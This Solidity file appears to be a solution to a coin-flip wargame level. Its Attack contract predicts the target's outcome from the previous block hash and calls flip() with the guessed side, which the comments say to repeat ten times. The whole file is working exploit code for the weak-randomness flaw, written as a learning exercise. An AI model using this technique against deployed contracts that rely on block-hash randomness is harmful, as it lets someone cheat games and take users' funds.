//SPDX-License-Identifier:MIT

pragma solidity ^0.8.7;

import "./CoinFlip.sol";   //CoinFlip is used to convert the address to contractABI then calling is easy

//in 2 ways we can call the target contract
//1.by using call
//2.by using contractABI

//sol:call the attackCoinFlip() 10 time 

//summary: randomness can't be acheived through the blockchain
contract Attack{
    CoinFlip public coinFlipABI;
    uint lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinAddress){
        coinFlipABI=CoinFlip(_coinAddress);
    }

    //attack function 
    function attackCoinFlip()external{    
            uint256 blockValue = uint256(blockhash(block.number-1));
            if (lastHash == blockValue) {
                 revert();
            }
            lastHash = blockValue;
            uint256 coinFlip = blockValue/(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            coinFlipABI.flip(side);
    }

    // function toCheckWins()external view returns(uint ){
    //     return (coinFlipABI.consecutiveWins);
    // }
    

}